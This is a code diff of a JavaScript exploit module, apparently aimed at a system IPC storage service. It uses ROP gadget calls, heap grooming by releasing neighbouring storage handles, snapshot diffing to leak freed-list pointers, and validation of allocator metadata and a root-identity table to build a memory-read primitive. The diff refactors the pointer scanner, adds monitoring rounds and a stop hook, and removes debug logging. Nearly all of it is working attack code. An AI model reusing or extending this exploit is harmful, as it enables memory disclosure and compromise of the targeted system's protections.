@@ -1,4 +1,4 @@
-import coreRuntime from "../runtime.mjs";
+import coreRuntime, {waitMs} from "../runtime.mjs";
 
 const {
   CachePlan,
@@ -9,9 +9,7 @@ const {
   hex32,
   ipcStorageGetSize,
   ipcStorageRead,
-  log,
   openContentStorage,
-  read32,
   read64
 } = coreRuntime;
 
@@ -47,7 +45,6 @@ export async function prepareReleaseNeighbors({
         var eh = openContentStorage(rootSession);
         if (!eh) {
             failureReason = "storage-open-failed-at-" + (ei + 1);
-            await log("WARN: extra IStorage " + ei + " open failed");
             break;
         }
         var primeOk = true;
@@ -56,9 +53,6 @@ export async function prepareReleaseNeighbors({
                 extraPrimeBuf);
             if (er.error !== 0) {
                 failureReason = "prime-read-failed-at-" + (ei + 1);
-                await log("WARN: extra" + ei + " prime @0x" +
-                    (pi * config.CONTROL_SIZE).toString(16) + " err=" +
-                    hex32(er.error));
                 primeOk = false;
                 break;
             }
@@ -70,9 +64,6 @@ export async function prepareReleaseNeighbors({
         totalPages += PRIME_BLOCKS;
         extraStorages.push(eh);
     }
-    await log("Extra neighbors: " + extraStorages.length +
-        "/" + MAX_EXTRA_NEIGHBORS + " maximum (" + totalPages +
-        " cache pages primed)");
 
     return {ok: true, eligible, extraStorages, attemptedStorages,
         expectedStorages: MAX_EXTRA_NEIGHBORS, failureReason};
@@ -93,7 +84,6 @@ export async function captureReleaseBaseline({
     // would add millions of read8 calls to this already-qualified sweep.
     call_rop(GADGET_MEMSET, previousBuffer, 0xA5n,
         BigInt(config.CACHE_READ_SIZE));
-    await log("LEAK: baseline 2 MiB read");
     var read0 = ipcStorageRead(candidateHandle, config.ALIAS_OFFSET,
         config.CACHE_READ_SIZE, previousBuffer);
 
@@ -118,16 +108,97 @@ export async function captureReleaseBaseline({
             }
             prevEnd = lo;
         }
-        snapshotOk = prefix0Ok && prevEnd > config.CONTROL_SIZE;
+        // The scan skips the first cache block and needs one full block after it.
+        const minimumScanSpan = config.CONTROL_SIZE * 2;
+        snapshotOk = prefix0Ok && prevEnd >= minimumScanSpan;
     }
-    await log("LEAK baseline: read=" + hex32(read0.error) +
-        " alias=" + (prefix0Ok ? "match" : "mismatch") +
-        " prefix=" + prefix0 + " data=0x" + prevEnd.toString(16) +
-        " (" + (prevEnd / 1024).toFixed(1) + " KiB)" +
-        " status=" + (snapshotOk ? "ready" : "rejected"));
 
     return {ok: true, previousBuffer, currentBuffer, prevEnd, snapshotOk,
         readError: read0.error, prefixMatches: prefix0Ok};
+}
+
+function scanSnapshotChanges(bufPrev, bufCur, prevEnd, config, primeHex, helpers, roundInfo) {
+    var prefixN = helpers.readHexBytes(bufCur, 16);
+    var prefixNOk = prefixN === primeHex;
+    var curEnd = config.CACHE_READ_SIZE;
+    var lastN = helpers.readHexBytes(
+        bufCur + BigInt(config.CACHE_READ_SIZE - 16), 16);
+    if (lastN === "a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5") {
+        var lo = config.CONTROL_SIZE, hi = config.CACHE_READ_SIZE;
+        while (lo < hi) {
+            var mid = ((lo + hi) >>> 1) & ~7;
+            if (read64(bufCur + BigInt(mid)) ===
+                0xA5A5A5A5A5A5A5A5n) hi = mid;
+            else lo = mid + 8;
+        }
+        curEnd = lo;
+    }
+
+    var effectiveEnd = Math.min(prevEnd, curEnd);
+    var blockCount = 0, changed = 0, clCount = 0;
+    var candidates = [];
+    for (var off = config.CONTROL_SIZE;
+        off + config.CONTROL_SIZE <= effectiveEnd;
+        off += config.CONTROL_SIZE) {
+        blockCount++;
+        var prevHead = read64(bufPrev + BigInt(off));
+        var curHead = read64(bufCur + BigInt(off));
+        if (prevHead === curHead) continue;
+        changed++;
+
+        var tailMatch = true;
+        for (var t = 8; t < config.CONTROL_SIZE; t += 8) {
+            if (read64(bufPrev + BigInt(off + t)) !==
+                read64(bufCur + BigInt(off + t))) {
+                tailMatch = false;
+                break;
+            }
+        }
+        if (tailMatch) clCount++;
+
+        var cBig = curHead;
+        var isPtr = cBig >= 0x100000000n && cBig < (1n << 39n);
+        var isAligned = isPtr && cBig % 0x4000n === 0n;
+        var low24ok = isPtr && (cBig & 0xFFFFFFn) !== 0n;
+
+        var zeroTail = false;
+        var zeroAfter32 = false;
+        if (isPtr && isAligned && low24ok) {
+            zeroTail = true;
+            for (var zt = 8; zt < 64; zt += 8) {
+                if (read64(bufCur + BigInt(off + zt)) !== 0n) {
+                    zeroTail = false;
+                    break;
+                }
+            }
+            zeroAfter32 = true;
+            for (var za = 32; za < config.CONTROL_SIZE; za += 8) {
+                if (read64(bufCur + BigInt(off + za)) !== 0n) {
+                    zeroAfter32 = false;
+                    break;
+                }
+            }
+        }
+
+        var strength = 0;
+        if (tailMatch && isPtr && isAligned && low24ok)
+            strength = 3;
+        else if (isPtr && isAligned && low24ok && zeroTail)
+            strength = 2;
+        else if (isPtr && isAligned && low24ok && zeroAfter32)
+            strength = 1;
+        if (strength > 0) {
+            candidates.push({
+                offset: off, target: cBig, round: roundInfo.round,
+                previous: prevHead,
+                neighbor: roundInfo.name, changedLink: tailMatch,
+                zeroTail, zeroAfter32, strength
+            });
+        }
+    }
+
+    return {prefixOk: prefixNOk, prefix: prefixN, curEnd, blockCount,
+            changed, clCount, candidates};
 }
 
 export async function releaseNeighborsAndFindPointers({
@@ -167,9 +238,7 @@ export async function releaseNeighborsAndFindPointers({
 
         for (var ri = 0; ri < neighbors.length && snapshotOk; ri++) {
             var nb = neighbors[ri];
-            await log("LEAK release " + (ri + 1) + "/" +
-                neighbors.length + ": closing " + nb.name);
-            var releaseCloseResult = Number(closeHandle(nb.handle)) >>> 0;
+            closeHandle(nb.handle);
             if (nb.name.indexOf("extra") === 0) {
                 var idx = parseInt(nb.name.slice(5));
                 extraStorages[idx] = 0;
@@ -183,102 +252,56 @@ export async function releaseNeighborsAndFindPointers({
             if (readN.error !== 0) {
                 stopReason = "snapshot-read-failed";
                 readError = readN.error;
-                await log("LEAK release " + (ri + 1) + "/" + neighbors.length +
-                    " " + nb.name + ": close=" + hex32(releaseCloseResult) +
-                    " read failed=" + hex32(readN.error));
                 break;
             }
 
-            var prefixN = helpers.readHexBytes(bufCur, 16);
-            var prefixNOk = prefixN === primeHex;
-            var curEnd = config.CACHE_READ_SIZE;
-            var lastN = helpers.readHexBytes(
-                bufCur + BigInt(config.CACHE_READ_SIZE - 16), 16);
-            if (lastN === "a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5") {
-                var lo = config.CONTROL_SIZE, hi = config.CACHE_READ_SIZE;
-                while (lo < hi) {
-                    var mid = ((lo + hi) >>> 1) & ~7;
-                    if (read64(bufCur + BigInt(mid)) ===
-                        0xA5A5A5A5A5A5A5A5n) hi = mid;
-                    else lo = mid + 8;
-                }
-                curEnd = lo;
-            }
+            var scan = scanSnapshotChanges(bufPrev, bufCur, prevEnd, config,
+                primeHex, helpers, {round: ri + 1, name: nb.name});
+            for (var ci = 0; ci < scan.candidates.length; ci++)
+                pointerCandidates.push(scan.candidates[ci]);
 
-            var effectiveEnd = Math.min(prevEnd, curEnd);
-            var blockCount = 0, changed = 0, clCount = 0;
-            for (var off = config.CONTROL_SIZE;
-                off + config.CONTROL_SIZE <= effectiveEnd;
-                off += config.CONTROL_SIZE) {
-                blockCount++;
-                var prevHead = read64(bufPrev + BigInt(off));
-                var curHead = read64(bufCur + BigInt(off));
-                if (prevHead === curHead) continue;
-                changed++;
-
-                var tailMatch = true;
-                for (var t = 8; t < config.CONTROL_SIZE; t += 8) {
-                    if (read64(bufPrev + BigInt(off + t)) !==
-                        read64(bufCur + BigInt(off + t))) {
-                        tailMatch = false;
-                        break;
-                    }
-                }
-                if (tailMatch) clCount++;
-
-                var cLo = Number(read32(bufCur + BigInt(off))) >>> 0;
-                var cHi = Number(read32(bufCur + BigInt(off + 4))) >>> 0;
-                var cBig = BigInt(cLo) | (BigInt(cHi) << 32n);
-                var cVal = cLo + cHi * 0x100000000;
-                var isPtr = cVal >= 0x100000000 && cBig < (1n << 39n);
-                var isAligned = cVal % 0x4000 === 0;
-                var low24ok = (cVal & 0xFFFFFF) !== 0;
-
-                var zeroTail = true;
-                for (var zt = 8; zt < 64; zt += 8) {
-                    if (read64(bufCur + BigInt(off + zt)) !== 0n) {
-                        zeroTail = false;
-                        break;
-                    }
-                }
-                var zeroAfter32 = true;
-                for (var za = 32; za < config.CONTROL_SIZE; za += 8) {
-                    if (read64(bufCur + BigInt(off + za)) !== 0n) {
-                        zeroAfter32 = false;
-                        break;
-                    }
-                }
-
-                var strength = 0;
-                if (tailMatch && isPtr && isAligned && low24ok)
-                    strength = 3;
-                else if (isPtr && isAligned && low24ok && zeroTail)
-                    strength = 2;
-                else if (isPtr && isAligned && low24ok && zeroAfter32)
-                    strength = 1;
-                if (strength > 0) {
-                    pointerCandidates.push({
-                        offset: off, target: cBig, round: ri + 1,
-                        previous: prevHead,
-                        neighbor: nb.name, changedLink: tailMatch,
-                        zeroTail, zeroAfter32, strength
-                    });
-                }
-            }
-
-            await log("LEAK release " + (ri + 1) + "/" + neighbors.length +
-                " " + nb.name + ": close=" + hex32(releaseCloseResult) +
-                " read=ok alias=" + (prefixNOk ? "match" : "mismatch") +
-                " prefix=" + prefixN + " data=0x" + curEnd.toString(16) +
-                " compared=" + blockCount + " changed=" + changed +
-                " changedLinks=" + clCount);
-            totalChangedLinks += clCount;
+            totalChangedLinks += scan.clCount;
             releaseRounds++;
 
             var tmp = bufPrev;
             bufPrev = bufCur;
             bufCur = tmp;
-            prevEnd = curEnd;
+            prevEnd = scan.curEnd;
+        }
+    }
+
+    var monitoringRounds = 0;
+    if (snapshotOk && pointerCandidates.length === 0 &&
+        config.MONITORING_ROUNDS > 0 && releaseRounds > 0) {
+        for (var mi = 0; mi < config.MONITORING_ROUNDS && snapshotOk; mi++) {
+            await waitMs(10);
+
+            call_rop(GADGET_MEMSET, bufCur, 0xA5n,
+                BigInt(config.CACHE_READ_SIZE));
+            var readM = ipcStorageRead(candidateHandle, config.ALIAS_OFFSET,
+                config.CACHE_READ_SIZE, bufCur);
+
+            if (readM.error !== 0) {
+                stopReason = "monitor-snapshot-read-failed";
+                readError = readM.error;
+                break;
+            }
+
+            var mscan = scanSnapshotChanges(bufPrev, bufCur, prevEnd, config,
+                primeHex, helpers,
+                {round: releaseRounds + mi + 1, name: "monitor" + mi});
+            for (var mci = 0; mci < mscan.candidates.length; mci++)
+                pointerCandidates.push(mscan.candidates[mci]);
+
+            totalChangedLinks += mscan.clCount;
+            monitoringRounds++;
+
+            var mtmp = bufPrev;
+            bufPrev = bufCur;
+            bufCur = mtmp;
+            prevEnd = mscan.curEnd;
+
+            if (pointerCandidates.length > 0) break;
         }
     }
 
@@ -293,23 +316,9 @@ export async function releaseNeighborsAndFindPointers({
 
         return a.offset - b.offset;
     });
-    await log("=== SEQUENTIAL RELEASE: " + releaseRounds +
-        " rounds, " + totalChangedLinks + " changedLinks, " +
-        pointerCandidates.length + " qualified ===");
-    for (var pi = 0; pi < pointerCandidates.length; pi++) {
-        var c = pointerCandidates[pi];
-        await log("  #" + (pi + 1) + " @0x" +
-            c.offset.toString(16) + ": 0x" +
-            c.target.toString(16) + " str=" + c.strength +
-            " from=0x" + c.previous.toString(16) +
-            " round=" + c.round + " (" + c.neighbor + ")" +
-            (c.changedLink ? " [changed-link]" : "") +
-            (c.zeroTail ? " [zero-tail]" : "") +
-            (c.zeroAfter32 ? " [zero-after-32]" : ""));
-    }
-
     return {ok: true, extraStorages, pointerCandidates,
-        releaseRounds, totalChangedLinks, stopReason, readError};
+        releaseRounds, monitoringRounds, totalChangedLinks, stopReason,
+        readError};
 }
 
 export async function qualifyAddressPlan({
@@ -320,6 +329,7 @@ export async function qualifyAddressPlan({
   candidateHandle,
   collectTimingProfile = false,
   reportProgress = null,
+  shouldStop = null,
   pointerCandidates,
   primeHex,
   rootSession,
@@ -381,26 +391,18 @@ export async function qualifyAddressPlan({
         });
         var knownPointerTotal = knownPointers.length;
         changedLinkCandidates = knownPointerTotal;
-        if (duplicateAddressTargets > 0)
-            await log("ADDRESS: skipped " + duplicateAddressTargets +
-                " duplicate target records");
         if (knownPointers.length > config.MAX_ADDRESS_CANDIDATES) {
-            await log("ADDRESS: candidate scan capped at " +
-                config.MAX_ADDRESS_CANDIDATES + " of " + knownPointerTotal);
             knownPointers = knownPointers.slice(0, config.MAX_ADDRESS_CANDIDATES);
         }
 
         if (knownPointers.length === 0) {
             addressFailureReason = "no-strength-3-changed-link-target";
-            await log("ADDRESS: skipped; no strength-3 changedLink target");
         } else {
             var sizeReply = ipcStorageGetSize(candidateHandle);
             if (sizeReply.error !== 0 || !sizeReply.size ||
                 !Number.isSafeInteger(sizeReply.size)) {
                 addressFailureReason = "storage-size-unavailable";
                 storageSizeError = sizeReply.error;
-                await log("ADDRESS: skipped; IStorage::GetSize=" +
-                    hex32(sizeReply.error));
             } else {
                 var candidatePlans = [];
                 var allPointerTargets = pointerCandidates.map(function(item) {
@@ -413,29 +415,18 @@ export async function qualifyAddressPlan({
                             Number(knownPointers[kp].target), sizeReply.size,
                             0x28000, allPointerTargets);
                     } catch (planError) {
-                        await log("ADDRESS candidate @0x" +
-                            knownPointers[kp].target.toString(16) +
-                            ": plan rejected (" + planError.message + ")");
                         continue;
                     }
 
                     var encodingControl = helpers.checkAddressHeaderEncoding(
                         candidatePlan.bytes, {savedHandle});
                     if (!encodingControl.ok) {
-                        await log("ADDRESS candidate @0x" +
-                            knownPointers[kp].target.toString(16) +
-                            ": header encoding rejected invalid=" +
-                            hex32(encodingControl.invalid.canonical) +
-                            " encoded=" + hex32(encodingControl.encoded.canonical));
                         continue;
                     }
                     candidatePlans.push({candidate: knownPointers[kp],
                         plan: candidatePlan});
                 }
 
-                await log("ADDRESS: " + candidatePlans.length + "/" +
-                    knownPointers.length + " changed-link candidates have valid plans" +
-                    " (total=" + knownPointerTotal + ")");
                 validAddressPlans = candidatePlans.length;
                 if (!candidatePlans.length)
                     addressFailureReason = "no-valid-address-plans";
@@ -447,8 +438,6 @@ export async function qualifyAddressPlan({
                     var aliasRequalified = aliasRecheck.error === 0 &&
                         helpers.readHexBytes(aliasRecheckBuf, 16) === primeHex;
                     addressAliasRequalified = aliasRequalified;
-                    await log("ADDRESS-ALIAS: " +
-                        (aliasRequalified ? "OK" : "FAIL"));
                     if (!aliasRequalified) {
                         addressFailureReason = "alias-recheck-failed";
                         addressFailureDetail = "read=" + hex32(aliasRecheck.error);
@@ -458,15 +447,14 @@ export async function qualifyAddressPlan({
                     if (addressPlan) {
                         var periodStartedAt = collectTimingProfile ? Date.now() : 0;
                         var periodResult = await helpers.qualifyCacheBucketPeriod({
-                            candidateHandle, primeHex, storageHandle, addressCopy
+                            candidateHandle, primeHex, storageHandle, addressCopy,
+                            shouldStop
                         });
                         if (collectTimingProfile)
                             timingProfile.period = (timingProfile.period || 0) +
                                 Date.now() - periodStartedAt;
                         addressCopy = periodResult.addressCopy;
                         bucketPeriodQualified = periodResult.ok;
-                        await log("ADDRESS: 0x28000 bucket period=" +
-                            (bucketPeriodQualified ? "qualified" : "unqualified"));
                         if (!bucketPeriodQualified) {
                             addressFailureReason = "cache-bucket-period-unqualified";
                             addressPlan = null;
@@ -476,23 +464,19 @@ export async function qualifyAddressPlan({
                     // A changed-link pointer is only a seed. Derive and validate
                     // allocator metadata anchors before attempting the layout
                     // capture; continue through bounded candidates on no-match.
-                    for (var ai = 0; addressPlan && ai < candidatePlans.length; ai++) {
+                    for (var ai = 0; addressPlan && !shouldStop?.() &&
+                        ai < candidatePlans.length; ai++) {
                         var addressCandidate = candidatePlans[ai];
                         addressPlan = addressCandidate.plan;
                         addressCandidatesTested++;
                         var addressLabel = "candidate " + (ai + 1) + "/" +
                             candidatePlans.length;
-                        await log("ADDRESS " + addressLabel + ": offset=0x" +
-                            addressCandidate.candidate.offset.toString(16) +
-                            " target=0x" + addressPlan.target.toString(16) +
-                            " readOff=0x" + addressPlan.readOffset.toString(16) +
-                            " base=0x" + addressPlan.base.toString(16));
 
                         var addressReadStartedAt = collectTimingProfile ? Date.now() : 0;
                         var candidateResult = await helpers.verifyAddressCandidate(
                             addressPlan, addressLabel, ai + 1, {
                                 config, addressPlan, candidateHandle, storageHandle,
-                                addressCopy
+                                addressCopy, shouldStop
                             });
                         if (collectTimingProfile)
                             timingProfile.addressReads =
@@ -531,12 +515,8 @@ export async function qualifyAddressPlan({
                             if (!metadataDiscovery.ok) {
                                 addressFailureReason = "metadata-anchor-discovery-failed";
                                 addressFailureDetail = metadataDiscovery.error || "unknown";
-                                await log("METADATA: discovery stopped: " +
-                                    metadataDiscovery.error);
                                 if (metadataDiscovery.continueSeed &&
                                     ai + 1 < candidatePlans.length) {
-                                    await log("METADATA: trying the next " +
-                                        "changed-link seed");
                                     continue;
                                 }
                                 break;
@@ -554,7 +534,7 @@ export async function qualifyAddressPlan({
                             var stopSeedScan = false;
                             var rootScansForSeed = 0;
                             var pageProbesBeforeSeed = metadataPageProbes;
-                            for (var mi = 0;
+                            for (var mi = 0; !shouldStop?.() &&
                                 mi < metadataDiscovery.anchors.length &&
                                     rootCandidateScans < config.MAX_ROOT_LAYOUT_SCANS &&
                                     metadataPageProbes < config.MAX_METADATA_PAGE_PROBES;
@@ -568,7 +548,7 @@ export async function qualifyAddressPlan({
                                     allPointerTargets, {
                                         config, addressPlan, metadataPageProbes,
                                         storageHandle, candidateHandle, savedHandle,
-                                        addressCopy
+                                        addressCopy, shouldStop
                                     });
                                 if (collectTimingProfile)
                                     timingProfile.pages = (timingProfile.pages || 0) +
@@ -579,10 +559,6 @@ export async function qualifyAddressPlan({
                                     addressFailureReason = "metadata-page-guard-failed";
                                     addressFailureDetail = metadataPageResult.error ||
                                         "reciprocal-link or page guard rejected";
-                                    if (metadataPageResult.error) {
-                                        await log("METADATA: page probe stopped: " +
-                                            metadataPageResult.error);
-                                    }
                                     if (metadataPageResult.continueScan) continue;
                                     stopSeedScan = true;
                                     break;
@@ -595,9 +571,6 @@ export async function qualifyAddressPlan({
                                 if (reportProgress)
                                     await reportProgress("ADDRESS_SCAN: Metadata page passed; " +
                                         "checking FSP root identity.");
-                                await log("ROOT: metadata page " +
-                                    (mi + 1) + "/" + metadataDiscovery.anchors.length +
-                                    " passed its reciprocal-link guard; checking domain table");
                                 var rootStartedAt = collectTimingProfile ? Date.now() : 0;
                                 try {
                                     var identityResult =
@@ -633,8 +606,6 @@ export async function qualifyAddressPlan({
                                 } catch (rootError) {
                                     addressFailureReason = "root-inspection-failed";
                                     addressFailureDetail = rootError.message;
-                                    await log("ROOT: inspection aborted: " +
-                                        rootError.message);
                                     rootStageVerified = false;
                                     rootCandidateRetryable = false;
                                 } finally {
@@ -666,73 +637,45 @@ export async function qualifyAddressPlan({
                             }
                             if (rootStageVerified) break;
                             if (rootCandidateScans >= config.MAX_ROOT_LAYOUT_SCANS) {
-                                await log("ROOT: metadata-page scan cap reached");
                                 break;
                             }
                             if (metadataPageProbes >= config.MAX_METADATA_PAGE_PROBES) {
-                                await log("METADATA: page-probe cap reached");
                                 break;
                             }
                             if (metadataDiscovery.capReached) {
-                                await log("METADATA: external-link candidate cap reached");
                                 break;
                             }
                             if (metadataDiscovery.stopAfterAnchors) {
-                                await log("METADATA: checked previously valid " +
-                                    "anchors, then stopped after a later read error");
                                 break;
                             }
                             if (rootCandidateRetryable && !stopSeedScan &&
                                 ai + 1 < candidatePlans.length) {
-                                await log("ROOT: no table match for the " +
-                                    "validated metadata pages; trying the next seed");
                                 continue;
                             }
                             if (tryNextSeed && ai + 1 < candidatePlans.length) {
-                                var poolHypotheses =
-                                    metadataDiscovery.poolCandidates || 0;
-                                var externalChecks =
-                                    metadataDiscovery.externalLinkChecks || 0;
-                                await log("METADATA: no external-link anchor " +
-                                    "qualified; pool hypotheses=" + poolHypotheses +
-                                    " checks=" + externalChecks + "/" +
-                                    poolHypotheses + "; trying the next " +
-                                    "changed-link seed");
                                 continue;
                             }
                             if (!stopSeedScan && metadataDiscovery.anchors.length > 0 &&
                                 rootScansForSeed === 0 && ai + 1 < candidatePlans.length) {
-                                await log("METADATA: no page passed its " +
-                                    "reciprocal-link guard; trying the next seed");
                                 continue;
-                            }
-                            if (rootCandidateRetryable) {
-                                await log("ROOT: no further seed candidate is available");
                             }
                             break;
                         }
                         if (!candidateResult.continueScan) {
                             addressFailureReason = "address-candidate-read-or-copy-failed";
-                            await log("ADDRESS: stopped candidate scan after a read/copy error");
                             break;
                         }
                         if (!candidateResult.verified) {
                             addressFailureReason = "address-read-guards-rejected-candidates";
                         }
-                        if (ai + 1 < candidatePlans.length)
-                            await log("ADDRESS: trying the next candidate");
                     }
 
-                    if (!addressReadVerified && addressCandidatesTested > 0)
-                        await log("ADDRESS: no candidate passed the read guards (tested=" +
-                            addressCandidatesTested + ")");
                 }
             }
         }
     } else {
         if (!addressFailureReason)
             addressFailureReason = "address-plan-preconditions-not-met";
-        await log("ADDRESS: skipped; alias or qualified pointer unavailable");
     }
 
     // S19 runs inside the candidate loop above. No host-side memory endpoint is
@@ -741,7 +684,6 @@ export async function qualifyAddressPlan({
     if (!addressReadVerified) {
         if (!addressFailureReason)
             addressFailureReason = "address-read-not-qualified";
-        await log("ROOT: skipped; address-read guards did not qualify");
     } else if (!rootStageVerified) {
         addressFailureReason = "root-identity-not-verified";
         if (!addressFailureDetail && rootCandidateRetryable)
